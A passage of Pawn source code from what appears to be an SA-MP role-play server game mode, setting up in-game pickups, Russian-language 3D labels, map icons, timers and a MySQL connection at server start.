	FormaFracPic[11] = CreatePickupAC(1275, 23, 229.9608,178.1518,1003.0313,122);
	FormaFracPic[12] = CreatePickupAC(1275, 23, 302.7346,171.9863,1214.7949,4);//LS
	FormaFracPic[13] = CreatePickupAC(1275, 23, 302.7346,171.9863,1214.7949,5);//LV
	FormaFracPic[14] = CreatePickupAC(1275, 23, 302.7346,171.9863,1214.7949,6);//FC
	FormaFracPic[15] = CreatePickupAC(1275, 23, 302.7346,171.9863,1214.7949,7);//CGH
	clothes = CreatePickupAC(1275, 23, 2137.9661,-2282.2017,20.6719, -1); // Работа Грузчика
	cashs = CreatePickupAC(1274, 23, 2127.5701,-2275.1938,20.6719, -1); // Зарплата грузчикам
	gunarm[0] = CreatePickupAC(353,23,245.6338,1859.2839,14.0840); // Оружие Армии
	gunarm[1] = CreatePickupAC(353,23,311.9774,-165.2273,999.6010,3); // Оружие Армии
	gummeria = CreatePickupAC(353,23,864.2610,345.8394,1081.7729,1); //Оружие Мэрии
	lsamat = CreatePickupAC(1239,23,2729.3267,-2451.5051,17.5937);
	lsaammo = CreatePickupAC(353,23,2744.2744,-2453.7742,13.8623);
	skinshop[0] = CreatePickupAC(1275,23,206.0302,-3.5463,1001.2109,1); // Магагазин Одежды
	skinshop[1] = CreatePickupAC(1275,23,205.9253,-12.9991,1001.2178,1); // Магагазин Одежды
	skinshop[2] = CreatePickupAC(1275,23,206.0302,-3.5463,1001.2109,2); // Магагазин Одежды
	skinshop[3] = CreatePickupAC(1275,23,205.9253,-12.9991,1001.2178,2); // Магагазин Одежды
	Army = GangZoneCreate(-49.979476, 1695.982177, 414.020507, 2175.982177);
	mast[0] = CreatePickupAC(1318,23,613.4505,3.7427,1000.9219); // Мастеркая LV
	mast[1] = CreatePickupAC(1318,23,613.4505,3.7427,1000.9219,1); // Мастеркая SF
	mast[2] = CreatePickupAC(1318,23,613.4505,3.7427,1000.9219,2); // Мастеркая LS
	SFa = GangZoneCreate(-1544.892, 270.5747, -1232.015, 558.5571);
	LSport = GangZoneCreate(2581.279, -2593.79, 2862.689, -2305.605);
	//============================ Инфо дальнобойщики ==========================
	mast[1] = CreatePickupAC(1318,23,613.4505,3.7427,1000.9219,1); // Мастеркая SF
	mast[2] = CreatePickupAC(1318,23,613.4505,3.7427,1000.9219,2); // Мастеркая LS
	CreatePickupAC(1239,23,-1731.4509,118.9413,3.5547);
	CreatePickupAC(1239,23,2601.7222,-2226.5867,13.3732);
	CreatePickupAC(1239,23,256.4736,1414.5182,10.7075);
	CreatePickupAC(1239,23,-1046.7723,-670.7208,32.3516);
	CreatePickupAC(1239,23,608.7718,847.8765,-43.1532);
	CreatePickupAC(1239,23,-1978.6846,-2434.8274,30.6250);
	CreatePickupAC(1239,23,-1873.0896,-1720.2430,21.7500);
	CreatePickupAC(1239,23,323.0342,1118.5804,1083.8828);
	//==========================================================================
	//CreateDynamic3DTextLabel("{ffa500}Street Racers: {ffffff}Чтобы заправиться/починить машину введите (( {00ff00}/stfill {ffffff}))",COLOR_BLUE,1604.7991,-1806.0012,13.4279,25.0,0,1);
	CreateDynamic3DTextLabel("Регистрация на бой\n{FFFFFF}/fight - зарегестрироваться на бой\n/startfight - начать бой",COLOR_BLUE,765.3245,10.8755,1000.7081+0.8,25.0);
	CreateDynamic3DTextLabel("{218065}~~~~~~~~~~~~~~~~~~~~\nСклад топлива\n{FFFFFF}''/ProdMenu''\n{218065}~~~~~~~~~~~~~~~~~~~~",-1,-1027.4069,-593.4584,32.0126+0.4,25.0);
	CreateDynamic3DTextLabel("{218065}~~~~~~~~~~~~~~~~~~~~\nСклад еды и товаров\n{FFFFFF}''/ProdMenu''\n{218065}~~~~~~~~~~~~~~~~~~~~",-1,-514.4622,-543.0626,25.5234+0.4,25.0);
	format(string,128, "Разгрузка урожая\nСтоимость урожая %i вирт",UrojSell);
	CreateDynamic3DTextLabel(string,0xFF9900FF,1630.0807,2323.3582,10.8203,25.0);
	CreateDynamic3DTextLabel("________________",0xFF9900FF,1630.0807,2323.3582,10.8203,25.0);
	format(string,128, "Разгрузка наркотиков\nСтоимость 1 гр. %i вирт",NarkSell);
	CreateDynamic3DTextLabel(string,0xFF9900FF,2178.3220,-1660.2120,14.9782,25.0);
	CreateDynamic3DTextLabel("____________________",0xFF9900FF,2178.3220,-1660.2120,14.9782,25.0);
	format(string,128, "Загрузка зерна\nСтоимость зерна %i вирт\n{FFFFFF}Посигнальте и шлакбаум поднимется\nили введите /prodopen",ZernBuy);
	CreateDynamic3DTextLabel(string,0xFF9900AA,2203.7983,-2251.9731,14.0000,15.0);
	CreateDynamic3DTextLabel("_______________",0xFF9900AA,2203.7983,-2251.9731,14.0000,15.0);
	//================================= 3D тексты ==============================
	CreateDynamic3DTextLabel("Чтобы воспользоваться лифтом, посигнальте",0xFF8000FF,-2441.0435,527.9462,29.9149,15.0);
	CreateDynamic3DTextLabel("Чтобы воспользоваться лифтом, посигнальте",0xFF8000FF,-2505.4043,529.6075,491.9152,15.0);
	CreateDynamic3DTextLabel("МЭРИЯ",0x6495EDFF,1481.1272,-1771.6830,19.2000,10.0);
	CreateDynamic3DTextLabel("CITY BANK",0x6495EDFF,1411.5237,-1699.5793,13.5395,10.0);
	CreateDynamic3DTextLabel("_________________\nАвто сдача\nна права\n_________________",TEAM_GROVE_COLOR,-2047.4098,-114.6060,1035.4432,10.0);
	CreateDynamic3DTextLabel(" < Приём на работу > ",0xFFFF00FF,359.8466,184.7337,1009.0000,10.0);
	CreateDynamic3DTextLabel("{33AA33}~~~~~~~~~~~~~~~~~\nКупить наркотики:\n{FFFFFF}\"/get drugs\"\n{33AA33}~~~~~~~~~~~~~~~~~",-1,323.0342,1118.5804,1083.8828,10.0);
	CreateDynamic3DTextLabel("~~~~~~~~~~~~~~~\nРегистрация\nна Гонку\n~~~~~~~~~~~~~~~",TEAM_GROVE_COLOR,822.3992,2.7049,1004.1797,10.0);
	CreateDynamic3DTextLabel("Точка наблюдения\n/camera",-1,212.2816,1812.2374,21.8672,10.0);
	CreateDynamic3DTextLabel("CAR SHOP\nclass: Nope",COLOR_REDD,562.4449,-1291.9125,17.2482,7.0);
	CreateDynamic3DTextLabel("CAR SHOP\nclass: C&D",COLOR_REDD,-1952.2794,297.8026,35.4688,7.0);
	CreateDynamic3DTextLabel("CAR SHOP\nclass: A&B",COLOR_REDD,2200.8857,1394.2892,11.0625,7.0);
	CreateDynamic3DTextLabel("CAR SHOP\nclass: A&B",COLOR_REDD,-1657.7015,1210.2267,7.2500,7.0);
	CreateDynamic3DTextLabel("{FFFF00}==== {33AA33}[ Помощь ] {FFFF00}====",COLOR_YELLOW,1160.3744,-1770.2209,17.2938,25.0);
	//========================== Пикапы входы/выходы ===========================
	tpadminhome[0] = CreatePickupAC(1239,23,47.7949,1001.1465,179.9551); // В здание админ дома
	tpadminhome[1] = CreatePickupAC(1239,23,-1629.1704,17.7326,178.9659); // Из здания админ дома
	chekmatlva[0] = CreatePickupAC(1239,2,223.8502,1931.5122,17.6406); // пикап1
	chekmatlva[1] = CreatePickupAC(1239,2,190.7502,1931.7085,17.6406); // пикап1
	chekmatlva[2] = CreatePickupAC(1239,2,155.8935,1903.3306,18.6603); // пикап3
	chekmatlva[3] = CreatePickupAC(1239,2,137.4635,1880.8014,17.8359); // пикап4
	chekmatlva[4] = CreatePickupAC(1239,2,117.9774,1869.8710,17.8359); // пикап5
	chekmatlva[5] = CreatePickupAC(1239,2,112.7323,1875.2440,17.8359); // пикап6
	chekmatlva[6] = CreatePickupAC(1239,2,153.5131,1845.9530,17.6406); // пикап7
	chekmatlva[7] = CreatePickupAC(1239,2,171.9801,1834.7606,17.6406); // пикап8
	chekmatlva[8] = CreatePickupAC(1239,2,176.9783,1841.3126,17.6406); // пикап9
	chekmatlva[9]= CreatePickupAC(1239,2,233.3041,1842.0875,17.6406); // пикап10
	lift = CreatePickupAC(1318,23,1147.8197,-1318.0120,13.6500); // пикап4
	kauta = CreatePickupAC(1318,23,-1345.5260,492.3939,18.2344); // пикап5
	kauta2 = CreatePickupAC(1318,23,-1329.1328,489.7521,24.7138,5); // пикап6
	lift2 = CreatePickupAC(1318,23,1161.4158,-1330.1571,31.4939); // пикап10
	lift3 = CreatePickupAC(1318,23,-2705.7395,640.1631,14.4531);
	cerkva = CreatePickupAC(1318,23,-1989.8993,1117.8569,54.4688);
	cerkva2 = CreatePickupAC(1318,23,-1938.0405,1118.8585,1332.7010,1);
	wmcvhod = CreatePickupAC(1318,23,662.8604,1716.4194,7.1875);
	vmcvqhod = CreatePickupAC(1318,23,502.0459,-67.6832,998.7578,52);
	vmcvhod = CreatePickupAC(1318,23,681.6075,-473.3458,16.5363);
	//rmspawn[0] = CreatePickupAC(1318, 23, 960.2988,1683.8674,8.8516);//????
	rmspawn[1] = CreatePickupAC(1318, 23, 1286.7781,-838.8546,1085.6328,4); // ?????
	lcnspawn[0] = CreatePickupAC(1318, 23, 1530.2140,751.0493,11.0234);//????
	lcnspawn[1] = CreatePickupAC(1318, 23, 1260.6464,-785.3956,1091.9063,4); // ?????
	wmcvqhod = CreatePickupAC(1318,23,501.7259,-67.6832,998.7578,998);
	pmcvhod = CreatePickupAC(1318,23,-2105.8921,-2480.8372,30.6250);
	pmcvqhod = CreatePickupAC(1318,23,501.7259,-67.6832,998.7578,8);
	lift4 = CreatePickupAC(1318,23,-2713.6804,631.2424,34.4028);
	lift5 = CreatePickupAC(1318,23,1599.6707,1815.2407,10.8203);
	lift6 = CreatePickupAC(1318,23,1608.3033,1786.1414,30.4688);
	ash = CreatePickupAC(1318,23,-2028.7731,-101.7868,35.4915); // автошкола
	ash2 = CreatePickupAC(1318,23,2357.8564,1655.1232,3040.7622,7);// выход автошколы
	nikname = CreatePickupAC(19134,23,866.8630,322.6510,1078.4357,1); // ????? ?????
	nikname2 = CreatePickupAC(19134,23,-1970.5245,1112.0775,1333.0092,1); // ????? ?????
	derbyrace[0] = CreatePickupAC(19134, 23, -2159.0461,640.3610,1052.3817); // пикап регистрации дерби
	derbyrace[1] = CreatePickupAC(1318, 23, -2109.9355,-443.3014,38.7344); // вход в дерби
	derbyrace[2] = CreatePickupAC(1318, 23, -2170.3154,635.4061,1052.3750); // выход
	paints[0] = CreatePickupAC(353, 23, 294.8574,-38.2151,1001.5156, 1);
	paints[1] = CreatePickupAC(1318, 23, 2595.8364,2790.6592,10.8203);
	paints[2] = CreatePickupAC(1318, 23, 285.5204,-41.8050,1001.5156, 1);
	arace = CreatePickupAC(19134, 23, 822.3992,2.7049,1004.1797); // Регистрация на гонку
	carpick[0] = CreatePickupAC(19133, 23, 562.4449,-1291.9125,17.2482, 0); // Автосалон 1 Вход
	carpick[1] = CreatePickupAC(19133, 23, -1952.2794,297.8026,35.4688, 0); // Автосалон 2 Вход
	carpick[2] = CreatePickupAC(19133, 23, 2200.8857,1394.2892,11.0625, 0); // Автосалон 3 Вход
	carpick[3] = CreatePickupAC(19133, 23, -1657.6984,1210.2471,7.2500, 0); // Автосалон 3 Вход
	racee[0] = CreatePickupAC(1318,23,1956.7323,-2183.6260,13.5469); // Гонка вход
	racee[1] = CreatePickupAC(1318,23,834.6671,7.2752,1004.1870); // Гонка выход
	victim2[0] = CreatePickupAC(1318,23,461.7025,-1500.7941,31.0454); // Магазин Одежды Вход
	victim2[1] = CreatePickupAC(1318,23,227.5632,-8.0904,1002.2109,2); // Магазин Одежды Выход
	zip[0] = CreatePickupAC(1318,23,-1694.1870,951.2703,24.8906); // Магазин ZIPSF Вход
	zip[1] = CreatePickupAC(1318,23,227.5632,-8.0904,1002.2109,1); // Магазин ZIPSF Выход
 	pdd = CreatePickupAC(1239,23,2335.7131,1657.5658,3040.9524,7); // Пикап ПДД
	buygunzakon[0] = CreatePickupAC(353,23,311.5954,-165.3113,999.6010,130); //gun FBI
	buygunzakon[1] = CreatePickupAC(353,23,1221.6064,1347.2103,3011.0005,4); //gun Police
	buygunzakon[2] = CreatePickupAC(353,23,311.9774,-165.2273,999.6010,1); //gun Police
	buygunzakon[3] = CreatePickupAC(353,23,302.5668,-127.6718,1004.0625,15); //gun Police
	lspd[0] = CreatePickupAC(1318,23,1555.1332,-1675.7180,16.1953);//Lspd вход
	lspd[1] = CreatePickupAC(1318,23,1209.9517,1332.2236,3011.0005,4);//Lspd выход
	lspd[2] = CreatePickupAC(1318,23,1194.5950,1335.7698,3011.0005,4);//Lspd выход в гараже
	lspd[3] = CreatePickupAC(1318,23,1564.7991,-1667.0013,28.3956);//Lspd выход из крыши
	lspd[4] = CreatePickupAC(1318,23,1568.6144,-1689.9901,6.2188);//Lspd Вход из гаража
	lspd[5] = CreatePickupAC(1318,23,1197.6259,1335.7543,3014.4912,4); //второй этаж выход
	lspd[6] = CreatePickupAC(1318,23,1219.9143,1335.8099,3014.4912,4); //вход в интерьер второго этажа
	lspd[7] = CreatePickupAC(1318,23,632.6918,1388.4894,3020.8884,4); //выход из интерьера второго этажа
	sf[4]  = CreatePickupAC(1318,23,-1606.4298,672.0637,-4.9063);//Lspd выход в гараже
	sf[0]  = CreatePickupAC(1318,23,316.3047,-170.2971,999.5938,1);//Lspd выход в гараже
	sf[1]  = CreatePickupAC(1318,23,213.9762,120.8990,999.0156);//Lspd выход в гараже
	sf[2] = CreatePickupAC(1318,23,-1594.2096,716.1803,-4.9063);//sfpd
	sf[3] = CreatePickupAC(1318,23,246.4636,107.2969,1003.2188);//сфпд
	sf[5] = CreatePickupAC(1318,23,-1605.5883,710.2720,13.8672);//сфпд
	lvpdpic[0] = CreatePickupAC(1318,23,2297.1138,2451.4346,10.8203);//lvpd вход с гаража
	lvpdpic[1] = CreatePickupAC(1318,23,238.7510,138.6254,1003.0234,122);//lvpd вход в гараж
	lvpdpic[2] = CreatePickupAC(1318,23,2337.1335,2459.3105,14.9742);//Центральный вход
	lvpdpic[3] = CreatePickupAC(1318,23,288.8456,166.9235,1007.1719,122);//Центральный выход
	lvpdpic[4] = CreatePickupAC(1318,23,2297.1165,2468.6892,10.8203);//lvpd оружие вход
	lvpdpic[5] = CreatePickupAC(1318,23,299.9460,-141.8767,1004.0625,15);//lvpd оружие выход
	lvpdpic[6] = CreatePickupAC(1318,23,2278.3835,2458.0950,38.6837);//крыша
	sfpdpic[0] = CreatePickupAC(19130,23,-2046.4412,453.8438,139.7422);
	sfpdpic[1] = CreatePickupAC(19130,23,-2056.5552,454.0199,35.1719);
	sfpdpic[2] = CreatePickupAC(1318,23,-2057.8728,441.9805,189.7110,2);
	sfpdpic[3] = CreatePickupAC(1318,23,-2053.5598,451.6628,35.1719);
	rmpic[0] = CreatePickupAC(1318,23,1298.7498,-797.0133,1084.0078,1);
	rmpic[1] = CreatePickupAC(1318,23,937.0892,1733.2124,8.8516);
	rmpic2[0] = CreatePickupAC(1318,23,1260.6467,-785.4053,1091.9063,1);
	rmpic2[1] = CreatePickupAC(1318,23,960.3885,1782.6185,8.8516);
	rmpick[0] = CreatePickupAC(1318,23,1286.8062,-838.8555,1085.6328,1);
	rmpick[1] = CreatePickupAC(1318,23,960.4630,1683.9728,8.8516);
	yakexit[0] = CreatePickupAC(1318,23,1298.7498,-797.0133,1084.0078);
	yakexit[1] = CreatePickupAC(1318,23,1456.1324,2773.4790,10.8203);
	fbi[1] = CreatePickupAC(1318,23,-2457.5020,516.7563,1039.1460,130); //Вход
	fbi[0] = CreatePickupAC(1318,23,-2456.1270,503.7910,30.0781); //Выход
	fbi[2] = CreatePickupAC(1318,23,-2457.0042,520.4381,492.1730); //Вход Крыша
	fbi[3] = CreatePickupAC(1318,23,-2454.8435,513.2433,45.5625); //Выход Крыша
	fbi[4] = CreatePickupAC(1318,23,-2477.3184,537.0898,1039.1460,130); //Выход Крыша
	fbi[5] = CreatePickupAC(1318,23,-2443.0410,494.4877,492.1183); //Выход Крыша
	lcnpic[0] = CreatePickupAC(1318,23,1298.8684,-797.0115,1084.0078,2);
	lcnpic[1] = CreatePickupAC(1318,23,1455.9155,751.0115,11.0234);
	lcnpic[2] = CreatePickupAC(1318,23,1260.6521,-785.4042,1091.9063,2);
	lcnpic[3] = CreatePickupAC(1318,23,1530.2097,751.0135,11.0234);
	addictionexit = CreatePickupAC(1318,23,318.6952,1114.5037,1083.8828);
	addictionenter =  CreatePickupAC(1318,23,2166.0068,-1671.3362,15.0734);
	armijavhod = CreatePickupAC(1318,23,140.0735,1939.5984,19.2991);
	armijavihod = CreatePickupAC(1318,23,153.8659,1944.3601,20.0000);
	marenter[0] = CreatePickupAC(1318,23,1481.1272,-1771.6830,18.7958);// Мэрия
	marenter[1]  = CreatePickupAC(1318,23,1413.2067,-1790.5966,15.4356);// Чёрный Вход мэрия
	marenter[2]  = CreatePickupAC(1318,23,848.0386,339.0159,1081.7656,1);// Чёрный Выход мэрия
	maria = CreatePickupAC(1318,23,1438.0618,-1790.1196,33.4297);
	mariaexit = CreatePickupAC(1318,23,870.3287,354.3390,1081.7677,1); // выход на крышу мэрии
	marexit = CreatePickupAC(1318,23,866.5795,313.7423,1078.4357,1);// Выход из мэрии
	bankpic[0] = CreatePickupAC(1318,23,1411.5237,-1699.5793,13.5395);//Банк вход
	bankpic[1] = CreatePickupAC(1318,23,1397.8778,-1672.0184,39.5649,3);//Банк выход
	bankpic[2] = CreatePickupAC(1318,23,-2172.0627,252.1688,35.3385); //Банк СФ вход.
	//banksf = CreatePickupAC(1318,23,-2172.0627,252.1688,35.3385);//Банк SF выход
	ballasvhod[0] = CreatePickupAC(1318,23,-68.8021,1351.1979,1080.2109,34);//Ballas на улицу
	ballasvhod[1] = CreatePickupAC(1318,23,2650.6992,-2021.8175,14.1766);//Ballas в интерьр
	rifa[0] = CreatePickupAC(1318,23,2807.6653,-1174.5896,1025.5703,63);//Рифа вход на улицу
	rifa[1] = CreatePickupAC(1318,23,2185.8225,-1815.2219,13.5469);//Рифа вход
	vagospic[0] = CreatePickupAC(1318,23,2770.7471,-1628.7227,12.1775);//Vagos вход
	vagospic[1] = CreatePickupAC(1318,23,2809.6873,-1603.2987,-36.9231,75);//Vagos выход
	aztecpic[0] = CreatePickupAC(1318,23,1667.52,-2106.94,14.07);//Aztec вход
	aztecpic[1] = CreatePickupAC(1318,23,-42.5856,1405.4747,1084.4297,36);//Aztec выход
	grooveexit = CreatePickupAC(1318,23,2495.7993,-1692.4044,1014.7422,1);//grove spawn выход
	grooveenter = CreatePickupAC(1318,23,2495.3271,-1690.9893,14.7656);//Дом грув
	zona = CreatePickupAC(1318,23,279.2340,1833.1393,18.0874);//стрелка2
	zonaa = CreatePickupAC(1318,23,291.8918,1833.7253,18.1027);//стрелка3
	sklad[0] = CreatePickupAC(1318,23,340.5722,1949.2020,22.0172);//стрелка4
	sklad[1] = CreatePickupAC(1318,23,316.3806,-170.2857,999.5938);//стрелка5
	sklad[2] = CreatePickupAC(1318,23,316.3806,-170.2857,999.5938,3);//стрелка6
	sklad[3] = CreatePickupAC(1318,23,-1373.0463,498.9842,11.1953);//стрелка7
	skladfbi = CreatePickupAC(1318,23,-2473.0159,511.5519,1039.1460,130);//стрелка7
	skladfbi2 = CreatePickupAC(1318,23,316.4419,-170.2977,999.5938,130);//стрелка7
	rob = CreatePickupAC(1239, 23, 2755.9060,-2515.5491,13.6397, -1);
	PickupRazd[0] = CreatePickupAC(1275, 23, 415.1374,2534.9619,10.0000, -1);
	PickupRazd[1] = CreatePickupAC(1275, 23, 141.1709,1382.5786,1083.8672, -1);
	PickupRazd[2] = CreatePickupAC(1275, 23, 2311.0996,-1135.9833,1054.3047, -1);
	PickupRazd[3] = CreatePickupAC(1275, 23, 21.7159,1414.6810,1084.4297, -1);
	PickupRazd[4] = CreatePickupAC(1275, 23, 264.3949,1285.9189,1080.2578, -1);
	PickupRazd[5] = CreatePickupAC(1275, 23, -270.5288,1451.5757,1088.8672, -1);
	PickupRazd[6] = CreatePickupAC(1275, 23, 235.5965,1079.4858,1087.8126, -1);
	PickupRazd[7] = CreatePickupAC(1275, 23, 23.4715,1349.0693,1088.8750, -1);
	PickupRazd[8] = CreatePickupAC(1275, 23, 479.2941,1406.1661,1084.4141, -1);
	PickupRazd[9] = CreatePickupAC(1275, 23, 223.8894,1249.7222,1082.1406, -1);
	PickupRazd[10] = CreatePickupAC(1275, 23, 2263.0842,-1132.6631,1050.6328, -1);
	PickupRazd[11] = CreatePickupAC(1275, 23, 308.1529,1120.4374,1083.8828, -1);
	PickupRazd[12] = CreatePickupAC(1275, 23, 267.1403,303.4059,999.1484, -1);
	PickupRazd[13] = CreatePickupAC(1275, 23, 2231.7356,-1112.2380,1050.8828, -1);
	PickupRazd[14] = CreatePickupAC(1275, 23, 224.6360,1152.0380,1082.6168, -1);
	PickupRazd[15] = CreatePickupAC(1275, 23, 2215.8215,-1074.6964,1050.4844, -1);
	PickupRazd[16] = CreatePickupAC(1275, 23, 2455.9214,-1700.5446,1013.5078, -1);
	PickupRazd[17] = CreatePickupAC(1275, 23, 229.0636,1287.0778,1082.1406, -1);
	PickupRazd[18] = CreatePickupAC(1275, 23, 331.6472,1477.1322,1084.4364, -1);
	PickupRazd[19] = CreatePickupAC(1275, 23, 377.6802,1461.8710,1080.1875, -1);
	PickupRazd[20] = CreatePickupAC(1275, 23, 260.6448,1255.4097,1084.2578, -1);
	PickupRazd[21] = CreatePickupAC(1275, 23, 2262.7839,-1216.7322,1049.0234, -1);
	PickupRazd[22] = CreatePickupAC(1275, 23, 304.7436,1471.2416,1080.2651, -1);
	PickupRazd[23] = CreatePickupAC(1275, 23, 369.9906,1409.3152,1081.3345, -1);
	PickupRazd[24] = CreatePickupAC(1275, 23, 374.6902,1413.1250,1081.3373, -1);
	PickupRazd[25] = CreatePickupAC(1275, 23, 443.3055,1399.4373,1084.3132, -1);
	PickupRazd[26] = CreatePickupAC(1275, 23, 2235.8845,-1073.9330,1049.0234, -1);
	PickupRazd[27] = CreatePickupAC(1275, 23, 2363.7671,-1127.4722,1050.8826, -1);
	PickupRazd[28] = CreatePickupAC(1275, 23, 228.3887,1195.7487,1080.2645, -1);
	PickupRazd[29] = CreatePickupAC(1275, 23, 2316.1655,-1010.7783,1054.7188, -1);
	PickupRazd[30] = CreatePickupAC(1275, 23, 230.8530,1111.2870,1080.9922, -1);
	PickupRazd[31] = CreatePickupAC(1275, 23, 234.1553,1047.2032,1084.0155, -1);
	//Руб
	//==========================================================================
	//CreateVehicles();
	Furi[0][gBallas] = 0;
	Furi[0][gVagos] = 0;
	Furi[0][gGrove] = 0;
	Furi[0][gAztek] = 0;
	Furi[0][gRifa] = 0;
	
	PlayerHaul[0][pLoad] = 0;
	PlayersHaul[0][sLoad] = 0;
	MatHaul[0][mCapasity] = 5000;
	MatHaul[1][mCapasity] = 5000;
	MatHaul[2][mCapasity] = 5000;
	//==========================================================================
	gettime(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	if(!realtime) SetWorldTime(wtime);
	//==========================================================================
	LimitPlayerMarkerRadius(100.0);
	ManualVehicleEngineAndLights();
	AllowInteriorWeapons(1);
	//==========================================================================
	//==========================================================================
	for(new i = 0; i < sizeof(CreatedCars); i++) CreatedCars[i] = 0;
	//==========================================================================
	for(new i = 0; i <= sizeof(Peds)-1; i++) AddPlayerClass(Peds[i][0],1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);
	//============================ Иконки на карте =============================
	CreateDynamicMapIcon(2492.3135,-1461.1936,24.0216, 42, -1, 0, -1, -1, 400.0);//Работа автоугонщика.
	CreateDynamicMapIcon(-2.9803,-363.4466,5.4297,51,0); // Развозчики
	CreateDynamicMapIcon(472.4380,-1515.5332,40.5726,45,0); // Victim LS
	CreateDynamicMapIcon(-1882.5100,866.3918,35.1719,45,0); // Victim SF
	CreateDynamicMapIcon(542.1437,-1272.3624,51.3059,55,0); // AutoSalone LS
	CreateDynamicMapIcon(-1948.4501,278.1562,68.9698,55,0); // AutoSalone SF
	CreateDynamicMapIcon(2200.9758,1394.2899,11.0625,55,0); // AutoSalone LV
	CreateDynamicMapIcon(2196.9663,1677.1544,12.3672,25,0); // Сasino Caligula
	CreateDynamicMapIcon(2019.3177,1007.7430,10.8203,43,0); // Сasino 4 Dragons
	CreateDynamicMapIcon(1657.0205,2254.5571,10.8203,25,0); // Сasino Bellaio
	CreateDynamicMapIcon(1481.2144,-1756.5200,17.5313,56,0); // Goverment
	CreateDynamicMapIcon(1552.8314,-1675.9022,16.1953,30,0); // Police LS
	CreateDynamicMapIcon(-1605.4998,710.2729,13.8672,30,0); // Police SF
	CreateDynamicMapIcon(2340.2075,2459.0200,14.9688,30,0); // Police LV
	CreateDynamicMapIcon(1173.6215,-1323.2500,15.1953,22,0); // Medics LS
	CreateDynamicMapIcon(-2664.6611,637.9663,14.4531,22,0); // Medics SF
	CreateDynamicMapIcon(1607.1716,1817.0586,10.8203,22,0); // Medics LV
	CreateDynamicMapIcon(-2243.8826,-87.9706,35.3203,49,0); // Misty
	CreateDynamicMapIcon(2312.4189,-1641.4185,22.3378,49,0); // Bar Grove Steet
	CreateDynamicMapIcon(1414.0972,-1701.0652,13.5395,52,0); // Bank LS
	CreateDynamicMapIcon(-2172.0627,252.1688,35.3385,52,0); // Bank SF
	CreateDynamicMapIcon(2421.2842,-1221.6509,25.4070,49,0); // Pig Pen
	CreateDynamicMapIcon(1834.7672,-1682.3358,13.4178,49,0); // Alhambra
	CreateDynamicMapIcon(-89.610397,1378.243530,10.469799,49,0); // Lil'Probe'in Bar
	CreateDynamicMapIcon(-2623.7166,1410.6890,7.0938,49,0); // Jizzy
	CreateDynamicMapIcon(-2026.9664,-100.3766,35.1641,36,0); // Autoschool
	CreateDynamicMapIcon(1365.6863,-1279.8872,13.5469,6,0); // Ammo LS
	CreateDynamicMapIcon(-2626.6384,210.3960,4.5971,6,0); // Ammo SF
	CreateDynamicMapIcon(2159.5449,943.2165,10.8203,6,0); // Ammo LV
	CreateDynamicMapIcon(2228.5789,-1721.7820,13.5654,54,0); // Спортзал LS
	CreateDynamicMapIcon(-2270.6406,-155.9734,35.3203,54,0); // Спортзал SF
	CreateDynamicMapIcon(1961.8124,-2189.2671,13.5469,53,0); // Race
	//============================= Zone 51 ====================================
	CreateDynamicMapIcon(212.2816,1812.2374,21.8672,56,0); // Точка наблюдения
	//=========================== Пицерии и Бургеры ============================
	CreateDynamicMapIcon(-1816.5311,618.6709,35.1719,50,0); // Pizza
	CreateDynamicMapIcon(-1911.7004,828.8093,35.1719,50,0); // Burger
	CreateDynamicMapIcon(-2336.1675,-168.1730,35.3203,50,0); // Burger
	CreateDynamicMapIcon(-2671.7808,257.9283,4.6328,50,0); // Pizza
	CreateDynamicMapIcon(2102.0913,-1808.8442,38.0027,50,0); // Pizza
	CreateDynamicMapIcon(2397.4641,-1903.6409,38.0027,50,0); // Pizza
	CreateDynamicMapIcon(800.9893,-1619.9106,38.0027,10,0); // Burger
	CreateDynamicMapIcon(932.5351,-1381.1470,32.0997,50,0); // Pizza
	CreateDynamicMapIcon(183.6340,1175.7919,22.6676,50,0); // Pizza
	CreateDynamicMapIcon(2420.4573,-1508.2711,24.0000,50,0); // Pizza
	CreateDynamicMapIcon(1204.3881,-915.2735,66.4264,50,0); // Burger
	CreateDynamicMapIcon(2391.6345,2041.7228,40.0850,50,0); // Pizza
	CreateDynamicMapIcon(1163.3766,2079.7026,40.0850,50,0); // Burger
	//==========================================================================
	AddVehicleComponent(Roadtrain[0], 1074);
	AddVehicleComponent(Roadtrain[1], 1074);
	AddVehicleComponent(Roadtrain[2], 1074);
	AddVehicleComponent(Roadtrain[3], 1074);
	AddVehicleComponent(Roadtrain[4], 1074);
	AddVehicleComponent(Roadtrain[5], 1074);
	//============================== Таймеры ===================================
	SetTimer("OnCheckTrigger",250,1);
	SetTimer("UpdateFresh", 250,1);
	freshtimer = SetTimer("Fresh", 1000,1);
	SetTimer("UpdateSpeedometr",150,1);
	Hptimer = SetTimer("HPCheck", 40000, 1);
	reklamatimer = SetTimer("ReklamaTimer",1800000,true);
	SetTimer("Recognition", 1500000, 1);
	SetTimer("GzCheck", 1000,1);
	//==========================================================================
	for(new Vehicles = 0; Vehicles < MAX_VEHICLES; Vehicles++) {
		Farmcar_pickup[Vehicles] = 0;
		CarHealth[Vehicles] = float(1000);
		car_pickup[Vehicles] = 0;
		enginebrokened[Vehicles] = 0;
		Fuell[Vehicles] = 200;
		vehcreat[Vehicles] = 0;
		new veh[128];
		format(veh, sizeof(veh), "%s", NameServer);
		SetVehicleNumberPlate(Vehicles, veh);
	 	SetVehicleParamsEx(Vehicles,false,false,false,false,false,false,false);
		SERVERCARID[Vehicles] = true;
	}
	//==========================================================================
	/////////////// MySQL загрузка мода ///////////////
	//
	printf("Подождите, пожалуйста, идёт загрузка . . .");
	//mysql_log();
	DATABASE = mysql_connect(SQL_HOST, SQL_USER, SQL_BASE, SQL_PASS);
	mysql_function_query(DATABASE,"SET NAMES cp1251",false,"","");
	mysql_function_query(DATABASE,"SET SESSION character_set_server='utf8';",false,"","");
	
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_HOUSE"`",true,"OnMySQL_QUERY","iis",11,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_BIZZ"`",true,"OnMySQL_QUERY","iis",6,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_WORKSHOPS"`",true,"OnMySQL_QUERY","iis",7,-1,"");
	// Бонусы
	mysql_function_query(DATABASE,"SELECT * FROM `boost`",true,"OnMySQL_QUERY","iis",34,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `boost`",true,"OnMySQL_QUERY","iis",35,-1,"");
	//===========
